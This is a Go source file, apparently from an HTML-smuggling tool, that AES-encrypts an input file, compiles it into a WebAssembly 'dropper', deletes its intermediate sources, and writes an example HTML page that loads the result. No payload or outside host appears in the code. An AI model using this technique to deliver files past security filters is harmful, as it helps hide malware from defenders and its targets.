package smuggle

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/fatih/color"
)

type Smuggler struct {

	// Main Components
	FunctionName string
	OutputFile   string
	//AES Components
	Key    []byte
	Buf    []byte
	EncBuf []byte
	KeyStr string
	BufStr string
}

func NewSmuggler(input, funcname string, Debug, tinygo bool) {
	var exampleHTML htmldata
	var wSmug Smuggler
	var err error

	_, exampleHTML.OutputFile = filepath.Split(input)
	exampleHTML.FunctionName = funcname
	wSmug.FunctionName = funcname
	wSmug.Buf = GetBytes(input)

	wSmug.BufStr, err = wSmug.AESEncrypt()
	if err != nil {
		log.Fatalf("Error writing smuggler source:\n%v\n", err)
	}

	wSmug.KeyStr = base64.StdEncoding.EncodeToString(wSmug.Key)

	if Debug {
		var decBuf []byte
		decBuf, err = aesDecrypt(wSmug.KeyStr, wSmug.BufStr)
		if err != nil {
			log.Fatalf("Error writing smuggler source:\n%v\n", err)
		} else {
			fmt.Println("AES Decryption successful")
			fmt.Println(string(decBuf))
		}
	}

	//write our smuggling template.
	smugglefilename := input + "_silkwasm.go"
	smuggleFilepath, err := filepath.Abs(smugglefilename)
	if err != nil {
		log.Fatalf("Error creating smuggler file: %v ", err)
	}
	smugglerFile, err := os.Create(smuggleFilepath)
	if err != nil {
		log.Fatalf("Error creating smuggler file: %v ", err)
	}

	//Write the final template
	err = wSmug.writeFinalTemplate(smugglerFile)
	if err != nil {
		log.Fatalf("Error writing smuggler source:\n%v\n", err)
	}
	smugglerFile.Close()
	if Debug {
		color.Green("Smuggler src written to: %s\n", smuggleFilepath)
	}

	//compile the dropper with the regular go compiler.

	compileWasm(smugglefilename, wSmug.OutputFile, tinygo)

	if !Debug {

		err = os.Remove(smugglefilename)
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("go.mod")
		if err != nil {
			log.Print(err)
		}
	}

	//write our smuggling template.
	example := "example.html"

	exampleFile, err := os.Create(example)
	if err != nil {
		log.Fatalf("Error creating smuggler file: %v ", err)
	}

	outname := fmt.Sprintf("%s", strings.ReplaceAll(smugglefilename, ".go", ""))

	exampleHTML.WasmFileName = outname + ".wasm"

	//Write the final template
	err = exampleHTML.writeHTMLTemplate(exampleFile)
	if err != nil {
		log.Fatalf("Error writing smuggler source:\n%v\n", err)
	}
	smugglerFile.Close()
	if Debug {
		color.Green("Smuggler src written to: %s\n", smuggleFilepath)
	}

	if tinygo {
		fmt.Printf("\nThe wasm-exec.js can be found in your tinygo path.\nThis is usually: $(tinygo env TINYGOROOT)/targets/wasm_exec.js and it is NOT the same as the one found in your GOPATH.")
	} else {
		fmt.Printf("\nThe wasm-exec.js can be found in your go bin path.\nThis is usually: $(go env GOROOT)/misc/wasm/wasm_exec.js \n\nConsider using tinygo if your wasm files are large.\n")
	}

}
